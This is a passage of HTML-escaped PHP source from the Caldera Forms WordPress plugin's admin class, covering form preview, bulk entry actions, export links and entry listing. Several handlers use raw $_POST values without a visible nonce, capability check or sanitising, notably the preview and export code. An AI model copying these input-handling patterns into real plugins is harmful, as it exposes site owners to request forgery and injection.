class=&quot;caldera-config-field&quot;&gt;&nbsp;</div></li><li><div>                    &lt;input type=&quot;text&quot; class=&quot;new-form-name block-input field-config&quot; name=&quot;name&quot; value=&quot;&quot; required=&quot;required&quot; autofocus=&quot;true&quot; autocomplete=&quot;off&quot; placeholder=&quot;&lt;?php echo esc_html__('Form Name', 'caldera-forms' ); ?&gt;&quot;&gt;&nbsp;</div></li><li><div>                &lt;/div&gt;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                &lt;button type=&quot;button&quot; class=&quot;cf-change-template-button&quot;&gt;&lt;span class=&quot;dashicons dashicons-arrow-left-alt&quot;&gt;&lt;/span&gt; &lt;?php echo esc_html__( 'Change Template', 'caldera-forms' ); ?&gt;&lt;/button&gt;&nbsp;</div></li><li><div>                &lt;button type=&quot;button&quot; class=&quot;cf-create-form-button ajax-trigger&quot; &nbsp;</div></li><li><div>                 data-action=&quot;create_form&quot;&nbsp;</div></li><li><div>                 data-active-class=&quot;disabled&quot;&nbsp;</div></li><li><div>                 data-load-class=&quot;disabled&quot;&nbsp;</div></li><li><div>                 data-callback=&quot;new_form_redirect&quot;&nbsp;</div></li><li><div>                 data-before=&quot;serialize_modal_form&quot;&nbsp;</div></li><li><div>                 data-modal-autoclose=&quot;new_form&quot;&nbsp;</div></li><li><div>                 data-nonce=&lt;?php echo wp_create_nonce( 'cf_create_form' ); ?&gt;&nbsp;</div></li><li><div>                &gt;&lt;?php echo esc_html__( 'Create Form', 'caldera-forms' ); ?&gt; &lt;span class=&quot;dashicons dashicons-yes&quot;&gt;&lt;/span&gt;&lt;span class=&quot;spinner&quot;&gt;&lt;/span&gt;&lt;/button&gt;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            &lt;/div&gt;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        &lt;/div&gt;&nbsp;</div></li><li><div>        &lt;?php&nbsp;</div></li><li><div>        /**&nbsp;</div></li><li><div>         * Runs at the bottom of the new form modal&nbsp;</div></li><li><div>         *&nbsp;</div></li><li><div>         * Use to add extra buttons, etc.&nbsp;</div></li><li><div>         *&nbsp;</div></li><li><div>         * @since 1.4.2&nbsp;</div></li><li><div>         */&nbsp;</div></li><li><div>        do_action( 'caldera_forms_new_form_modal_bottom' );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    public function get_form_preview() {&nbsp;</div></li><li><div>        global $post;&nbsp;</div></li><li><div>        add_filter('caldera_forms_render_form_element', array( $this, 'set_preview_form_element') );&nbsp;</div></li><li><div>        $post = get_post( (int) $_POST['post_id'] );&nbsp;</div></li><li><div>        if( isset($_POST['atts']['named']['id']) ) {&nbsp;</div></li><li><div>            $form = $_POST['atts']['named']['id'];&nbsp;</div></li><li><div>        }elseif( isset($_POST['atts']['named']['name']) ) {&nbsp;</div></li><li><div>            $form = $_POST['atts']['named']['name'];&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_filter('caldera_forms_get_form-' . $form, array( $this, 'set_preview_get_form'), 100 );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $atts = $_POST['atts']['named'];&nbsp;</div></li><li><div>        $atts['preview'] = true;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if( !empty( $form ) ) {&nbsp;</div></li><li><div>            ob_start();&nbsp;</div></li><li><div>            wp_head();&nbsp;</div></li><li><div>            echo Caldera_Forms::render_form( $form );&nbsp;</div></li><li><div>            wp_print_footer_scripts();&nbsp;</div></li><li><div>            $html = ob_get_clean();&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        $out = array();&nbsp;</div></li><li><div>        if( !empty( $html ) ) {&nbsp;</div></li><li><div>            $out['html'] = $html;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        wp_send_json_success( $out );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>    public function set_preview_get_form( $form ) {&nbsp;</div></li><li><div>        $form['form_ajax'] = false;&nbsp;</div></li><li><div>        $form['settings']['responsive']['break_point'] = 'xs';&nbsp;</div></li><li><div>        return $form;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>    public function set_preview_form_element($element) {&nbsp;</div></li><li><div>        return 'div';&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    public function prepare_filter_addons($plugins) {&nbsp;</div></li><li><div>        global $wp_list_table, $status;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if( !empty( $this-&gt;addons ) ) {&nbsp;</div></li><li><div>            $addons = array();&nbsp;</div></li><li><div>            foreach( $this-&gt;addons as $addon ) {&nbsp;</div></li><li><div>                $plugin_slug = basename( dirname( $addon['file'] ) ) .'/'.basename( $addon['file'] );&nbsp;</div></li><li><div>                if( isset( $plugins[$plugin_slug] ) ) {&nbsp;</div></li><li><div>                    if( isset( $addon['slug'] ) ) {&nbsp;</div></li><li><div>                        $plugins[$plugin_slug]['slug'] = $addon['slug'];&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        if( isset( $_REQUEST['plugin_status'] ) && $_REQUEST['plugin_status'] === 'caldera_forms' ) {&nbsp;</div></li><li><div>            $status = 'caldera_forms';&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        return $plugins;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    public function bulk_action() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // first validate&nbsp;</div></li><li><div>        self::verify_ajax_action();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if(empty($_POST['do'])) {&nbsp;</div></li><li><div>            die;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $do_action = strtolower( $_POST['do'] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        switch ( $do_action ) {&nbsp;</div></li><li><div>            case 'active':&nbsp;</div></li><li><div>            case 'trash':&nbsp;</div></li><li><div>            case 'delete':&nbsp;</div></li><li><div>                global $wpdb;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                $result = false;&nbsp;</div></li><li><div>                $items = array();&nbsp;</div></li><li><div>                $selectors = array();&nbsp;</div></li><li><div>                foreach ( (array) $_POST[ 'items' ] as $item_id ) {&nbsp;</div></li><li><div>                    $items[] = (int) $item_id;&nbsp;</div></li><li><div>                    $selectors[] = '#entry_row_' . (int) $item_id;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                switch ( $do_action ) {&nbsp;</div></li><li><div>                    case 'delete':&nbsp;</div></li><li><div>                        if( current_user_can( 'delete_others_posts' ) ) {&nbsp;</div></li><li><div>                            $result = Caldera_Forms_Entry_Bulk::delete_entries( $items );&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>                        $out['status'] = 'reload';&nbsp;</div></li><li><div>                        wp_send_json( $out );&nbsp;</div></li><li><div>                        break;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    default:&nbsp;</div></li><li><div>                        if( current_user_can( 'edit_others_posts' ) ) {&nbsp;</div></li><li><div>                            $result = Caldera_Forms_Entry_Bulk::change_status( $items, $do_action );&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>                        break;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                if( $result ) {&nbsp;</div></li><li><div>                    $out[ 'status' ]    = $do_action;&nbsp;</div></li><li><div>                    $out[ 'undo' ]      = ( $do_action === 'trash' ? 'active' : esc_html__( 'Trash', 'caldera-forms' ) );&nbsp;</div></li><li><div>                    $out[ 'undo_text' ] = ( $do_action === 'trash' ? esc_html__( 'Restore', 'caldera-forms' ) : esc_html__( 'Trash', 'caldera-forms' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    $form = strip_tags( $_POST[ 'form' ] );&nbsp;</div></li><li><div>                    $out[ 'entries' ] = implode( ', ', $selectors );&nbsp;</div></li><li><div>                    $out[ 'total' ]   = Caldera_Forms_Entry_Bulk::count( $form, false );&nbsp;</div></li><li><div>                    $out[ 'trash' ]   = Caldera_Forms_Entry_Bulk::count( $form, 'trash' );&nbsp;</div></li><li><div>                    wp_send_json( $out );&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>                exit();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                break;&nbsp;</div></li><li><div>            case 'export':&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                $transientid = uniqid('cfe');&nbsp;</div></li><li><div>                Caldera_Forms_Transient::set_transient(  $transientid, $_POST['items'], 180 );&nbsp;</div></li><li><div>                $out['url'] = &quot;admin.php?page=caldera-forms&export=&quot; . $_POST['form'] . &quot;&tid=&quot; . $transientid;&nbsp;</div></li><li><div>                wp_send_json( $out );&nbsp;</div></li><li><div>                exit();&nbsp;</div></li><li><div>                break;&nbsp;</div></li><li><div>            default:&nbsp;</div></li><li><div>                # code...&nbsp;</div></li><li><div>                break;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        exit();&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Dismiss admin pointer&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since unknown&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @uses &quot;wp_ajax_cf_dismiss_pointer&quot; action&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function update_pointer() {&nbsp;</div></li><li><div>        if( ! isset( $_POST[ 'nonce' ] ) || ! wp_verify_nonce( $_POST[ 'nonce' ], 'cf_dismiss_pointer' ) ) {&nbsp;</div></li><li><div>            status_header( 500 );&nbsp;</div></li><li><div>            exit;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( ! empty( $_POST[ 'pointer' ] ) ) {&nbsp;</div></li><li><div>            add_user_meta( get_current_user_id(), 'cf_pointer_' . $_POST[ 'pointer' ], array( 0 =&gt; NULL ) );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        exit;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Load the plugin text domain for translation.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function load_plugin_textdomain() {&nbsp;</div></li><li><div>        load_plugin_textdomain( $this-&gt;plugin_slug, FALSE, basename( CFCORE_PATH ) . '/languages');&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    public static function add_shortcode_inserter() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $screen = get_current_screen();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if($screen-&gt;base === 'post') {&nbsp;</div></li><li><div>            include CFCORE_PATH . 'ui/insert_shortcode.php';&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    public static function get_admin_templates() {&nbsp;</div></li><li><div>        include CFCORE_PATH . 'ui/news_templates.php';&nbsp;</div></li><li><div>        include CFCORE_PATH . 'ui/admin_templates.php';&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>    public static function get_admin_meta_templates() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $processors = $processors = Caldera_Forms_Processor_Load::get_instance()-&gt;get_processors();&nbsp;</div></li><li><div>        if(!empty($processors)) {&nbsp;</div></li><li><div>            foreach($processors as $processor_type=&gt;$processor_config) {&nbsp;</div></li><li><div>                if( isset( $processor_config['meta_template'] ) && file_exists( $processor_config['meta_template'] ) ) {&nbsp;</div></li><li><div>                    echo &quot;{{#if &quot;.$processor_type.&quot;_template}}\r\n&quot;;&nbsp;</div></li><li><div>                    echo &quot;{{#each data}}\r\n&quot;;&nbsp;</div></li><li><div>                    echo &quot;{{#if title}}\r\n&quot;;&nbsp;</div></li><li><div>                    echo &quot;&lt;h4&gt;{{title}}&lt;/h4&gt;\r\n&quot;;&nbsp;</div></li><li><div>                    echo &quot;{{/if}}\r\n&quot;;&nbsp;</div></li><li><div>                    echo &quot;{{#each entry}}\r\n&quot;;&nbsp;</div></li><li><div>                    include $processor_config['meta_template'];&nbsp;</div></li><li><div>                    echo &quot;{{/each}}\r\n&quot;;&nbsp;</div></li><li><div>                    echo &quot;{{/each}}\r\n&quot;;&nbsp;</div></li><li><div>                    echo &quot;{{/if}}\r\n&quot;;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Get the entry editor's buttons&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since unknown&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @deprecated&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function get_entry_actions() {&nbsp;</div></li><li><div>        _deprecated_function( __FUNCTION__, 'Caldera_Forms_Entry_UI::get_entry_actions()', '1.5.0' );&nbsp;</div></li><li><div>        Caldera_Forms_Entry_UI::get_entry_actions();&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Set buttons for entry viewer&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.4.0&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @uses &quot;caldera_forms_entry_viewer_buttons&quot; filter&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param array $buttons&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return array&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function set_viewer_buttons($buttons) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $buttons[ 'close_panel' ] = array(&nbsp;</div></li><li><div>            'label' =&gt; esc_html__( 'Close', 'caldera-forms' ), &nbsp;</div></li><li><div>            'config' =&gt; 'dismiss', &nbsp;</div></li><li><div>            'class' =&gt; 'right'&nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( current_user_can( 'edit_others_posts' ) ) {&nbsp;</div></li><li><div>            $buttons[ 'edit_entry' ] = array(&nbsp;</div></li><li><div>                'label' =&gt; esc_html__( 'Edit Entry', 'caldera-forms' ), &nbsp;</div></li><li><div>                'config' =&gt; array(&nbsp;</div></li><li><div>                    'data-trigger' =&gt; '#edit-entry-{{_entry_id}}'&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                'class' =&gt; 'button-primary'&nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        return $buttons;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    public static function set_editor_buttons($buttons) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $buttons['submit_form'] = array(&nbsp;</div></li><li><div>            'label' =&gt;    esc_html__( 'Save Changes', 'caldera-forms' ), &nbsp;</div></li><li><div>            'config' =&gt;    array(&nbsp;</div></li><li><div>                &quot;data-for&quot; =&gt; &quot;#view_entry_baldrickModalBody .caldera_forms_form&quot;&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>            'class' =&gt;    'right button-primary'&nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>        $buttons['view_entry'] = array(&nbsp;</div></li><li><div>            'label' =&gt;    esc_html__( 'View Entry', 'caldera-forms' ), &nbsp;</div></li><li><div>            'config' =&gt;    array(&nbsp;</div></li><li><div>                &quot;data-for&quot; =&gt; &quot;.view-entry-btn.current-view&quot;&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>            'class' =&gt;    ''&nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        return $buttons;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    public static function save_cf_setting() {&nbsp;</div></li><li><div>        self::verify_ajax_action();&nbsp;</div></li><li><div>        if(empty($_POST['set'])) {&nbsp;</div></li><li><div>            exit;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        $style_includes = get_option( '_caldera_forms_styleincludes' );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if(empty($style_includes[$_POST['set']])) {&nbsp;</div></li><li><div>            $style_includes[$_POST['set']] = true;&nbsp;</div></li><li><div>        }else{&nbsp;</div></li><li><div>            $style_includes[$_POST['set']] = false;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        update_option( '_caldera_forms_styleincludes', $style_includes);&nbsp;</div></li><li><div>        wp_send_json( $style_includes );&nbsp;</div></li><li><div>        exit;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Insert shortcode media button&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    function shortcode_insert_button() {&nbsp;</div></li><li><div>        global $post;&nbsp;</div></li><li><div>        if(!empty($post)) {&nbsp;</div></li><li><div>            echo &quot;&lt;a id=\&quot;caldera-forms-form-insert\&quot; title=\&quot;&quot;. esc_attr__( 'Add Form to Page', 'caldera-forms' ) . &quot;\&quot; class=\&quot;button caldera-forms-insert-button\&quot; href=\&quot;#inst\&quot;&gt;\n&quot;;&nbsp;</div></li><li><div>            echo &quot;    &lt;img src=\&quot;&quot;. CFCORE_URL . &quot;assets/images/caldera-globe-logo-sm.png\&quot; alt=\&quot;&quot;. esc_attr__( 'Insert Form Shortcode' , 'caldera-forms') . &quot;\&quot; style=\&quot;padding: 0px 2px 0px 0px; width: 16px; margin: -2px 0px 0px;\&quot; /&gt; &quot;.__('Caldera Form', 'caldera-forms' ).&quot;\n&quot;;&nbsp;</div></li><li><div>            echo &quot;&lt;/a&gt;\n&quot;;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>    function shortcode_insert_button_fs($buttons) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $buttons['caldera-forms'] = array(&nbsp;</div></li><li><div>            &quot;title&quot; =&gt;    __( 'Add Form to Page', 'caldera-forms' ), &nbsp;</div></li><li><div>            &quot;both&quot; =&gt; true&nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>        return $buttons;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Change form's state&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @uses &quot;wp_ajax_toggle_form_state&quot; action&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since unknown&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function toggle_form_state() {&nbsp;</div></li><li><div>        if( ! isset( $_POST[ 'nonce' ] ) || !wp_verify_nonce( $_POST[ 'nonce' ], 'toggle_form_state' ) ) {&nbsp;</div></li><li><div>            wp_send_json_error( $_POST );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $forms = Caldera_Forms_Forms::get_forms( true );&nbsp;</div></li><li><div>        $form = sanitize_text_field( $_POST['form'] );&nbsp;</div></li><li><div>        $form = Caldera_Forms_Forms::get_form( $form );&nbsp;</div></li><li><div>        if( empty( $form ) || empty( $form['ID'] ) || empty( $forms[ $form['ID'] ]) ) {&nbsp;</div></li><li><div>            wp_send_json_error( );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if( isset( $form['form_draft'] ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            Caldera_Forms_Forms::form_state( $form );&nbsp;</div></li><li><div>            $state = 'active-form';&nbsp;</div></li><li><div>            $label = esc_html__( 'Deactivate', 'caldera-forms' );&nbsp;</div></li><li><div>        }else{&nbsp;</div></li><li><div>            Caldera_Forms_Forms::form_state( $form , false );&nbsp;</div></li><li><div>            $state = 'draft-form';&nbsp;</div></li><li><div>            $label = esc_html__( 'Activate', 'caldera-forms' );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        wp_send_json_success( array( 'ID' =&gt; $form['ID'], 'state' =&gt; $state, 'label' =&gt; $label ) );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * nonce verifier for ajax actions&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.3.2.1&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    private static function verify_ajax_action() {&nbsp;</div></li><li><div>        if ( ! isset( $_POST['cf_toolbar_actions'] ) || ! wp_verify_nonce( $_POST['cf_toolbar_actions'], 'cf_toolbar' ) || !check_admin_referer( 'cf_toolbar', 'cf_toolbar_actions' ) ) {&nbsp;</div></li><li><div>            wp_send_json_error( $_POST );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Show entries in admin&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @deprecated 1.4.0 Use Caldera_Forms_Entry_UI::view_entries()&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since unknown&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function browse_entries() {&nbsp;</div></li><li><div>        _deprecated_function( __FUNCTION__, '1.4.0', 'Caldera_Forms_Entry_UI::view_entries' );&nbsp;</div></li><li><div>        self::verify_ajax_action();&nbsp;</div></li><li><div>        if ( isset( $_POST[ 'page' ] ) && 0 &lt; $_POST[ 'page' ] ) {&nbsp;</div></li><li><div>            $page = absint( $_POST[ 'page' ] );&nbsp;</div></li><li><div>        }else{&nbsp;</div></li><li><div>            $page = 1;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        $entry_perpage = get_option( '_caldera_forms_entry_perpage', 20 );&nbsp;</div></li><li><div>        if ( isset( $_POST[ 'perpage' ] ) && 0 &lt; $_POST[ 'perpage' ] ) {&nbsp;</div></li><li><div>            $perpage = absint( (int) $_POST[ 'perpage' ] );&nbsp;</div></li><li><div>            if( $entry_perpage != $perpage ) {&nbsp;</div></li><li><div>                update_option( '_caldera_forms_entry_perpage', $perpage );&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }else{&nbsp;</div></li><li><div>            $perpage = $entry_perpage;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( isset( $_POST[ 'status' ] ) ) {&nbsp;</div></li><li><div>            $status = strip_tags( $_POST[ 'status' ] );&nbsp;</div></li><li><div>        }else{&nbsp;</div></li><li><div>            $status = 'active';&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $form = Caldera_Forms_Forms::get_form( $_POST['form'] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $data = self::get_entries( $form, $page, $perpage, $status );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // set status output&nbsp;</div></li><li><div>        $data['is_' . $status ] = true;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        wp_send_json( $data );&nbsp;</div></li><li><div>        exit;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Get entries from a form&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.2.1&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param string|array $form Form ID or form config.&nbsp;</div></li><li><div>     * @param int $page Optional. Page of entries to get per page. Default is 1.&nbsp;</div></li><li><div>     * @param int $perpage Optional. Number of entries per page. Default is 20.&nbsp;</div></li><li><div>     * @param string $status Optional. Form status. Default is active.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return array&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function get_entries( $form, $page = 1, $perpage = 20, $status = 'active' ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( is_string( $form ) ) {&nbsp;</div></li><li><div>            $form = Caldera_Forms_Forms::get_form( $form );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( isset( $form[ 'ID' ])) {&nbsp;</div></li><li><div>            $form_id = $form[ 'ID' ];&nbsp;</div></li><li><div>        }else{&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        global $wpdb;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $field_labels = array();&nbsp;</div></li><li><div>        $backup_labels = array();&nbsp;</div></li><li><div>        $selects = array();&nbsp;</div></li><li><div>        &nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $fields = array();&nbsp;</div></li><li><div>        if ( ! empty( $form[ 'fields' ] ) ) {&nbsp;</div></li><li><div>            foreach ( $form[ 'fields' ] as $fid =&gt; $field ) {&nbsp;</div></li><li><div>                $fields[ $field[ 'slug' ] ] = $field;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                if ( ! empty( $field[ 'entry_list' ] ) ) {&nbsp;</div></li><li><div>                    $selects[] = &quot;'&quot; . $field[ 'slug' ] . &quot;'&quot;;&nbsp;</div></li><li><div>                    $field_labels[ $field[ 'slug' ] ] = $field[ 'label' ];&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>                $has_vars = array();&nbsp;</div></li><li><div>                if ( ! empty( $form[ 'variables' ][ 'types' ] ) ) {&nbsp;</div></li><li><div>                    $has_vars = $form[ 'variables' ][ 'types' ];&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>                if ( ( count( $backup_labels ) &lt; 4 && ! in_array( 'entryitem', $has_vars ) ) && in_array( $field[ 'type' ], array(&nbsp;</div></li><li><div>                        'text', &nbsp;</div></li><li><div>                        'email', &nbsp;</div></li><li><div>                        'date', &nbsp;</div></li><li><div>                        'name'&nbsp;</div></li><li><div> ) )&nbsp;</div></li><li><div> ) {&nbsp;</div></li><li><div>                    // backup only first 4 fields&nbsp;</div></li><li><div>                    $backup_labels[ $field[ 'slug' ] ] = $field[ 'label' ];&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( empty( $field_labels ) ) {&nbsp;</div></li><li><div>            $field_labels = $backup_labels;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $entries = new Caldera_Forms_Entry_Entries( $form, $perpage );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $data = array();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $filter = null;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $data[ 'trash' ]  = $entries-&gt;get_total( 'trash' );&nbsp;</div></li><li><div>        $data[ 'active' ] = $entries-&gt;get_total( 'active' );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // set current total&nbsp;</div></li><li><div>        if ( ! empty( $status ) && isset( $data[ $status ] ) ) {&nbsp;</div></li><li><div>            $data[ 'total' ] = $entries-&gt;get_total( $status );&nbsp;</div></li><li><div>        } else {&nbsp;</div></li><li><div>            $data[ 'total' ] = $data[ 'active' ];&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $data[ 'pages' ] = ceil( $data[ 'total' ] / $perpage );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( ! empty( $page ) ) {&nbsp;</div></li><li><div>            $page = abs( $page );&nbsp;</div></li><li><div>            if ( $page &gt; $data[ 'pages' ] ) {&nbsp;</div></li><li><div>                $page = $data[ 'pages' ];&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $data['current_page'] = $page;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if($data['total'] &gt; 0) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $data[ 'form' ] = $form_id;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $data[ 'fields' ] = $field_labels;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $the_entries = $entries-&gt;get_page( $page, $status );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if ( ! empty( $the_entries ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                $ids = array();&nbsp;</div></li><li><div>                $data[ 'entries' ] = array();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                /** @var Caldera_Forms_Entry $an_entry */&nbsp;</div></li><li><div>                foreach ( $the_entries as $an_entry ) {&nbsp;</div></li><li><div>                    $ids[] = $an_entry-&gt;get_entry_id();&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>                // init field types to initialize view rendering in entry lists&nbsp;</div></li><li><div>                